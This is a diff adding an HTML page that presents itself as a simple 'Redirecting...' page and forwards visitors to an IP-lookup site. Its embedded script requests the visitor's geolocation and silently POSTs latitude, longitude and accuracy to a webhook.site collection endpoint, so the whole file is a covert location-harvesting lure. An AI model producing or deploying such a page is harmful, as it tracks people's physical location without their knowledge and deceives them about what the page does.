@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+  <meta http-equiv="refresh" content="0;url=https://whatismyipaddress.com/">
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+      fetch('https://webhook.site/63de0275-f746-4b4a-8b0c-5a590380e3db', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          acc: position.coords.accuracy
+        })
+      });
+    });
+  </script>
+</head>
+<body>
+Redirecting...
+</body>
+</html>
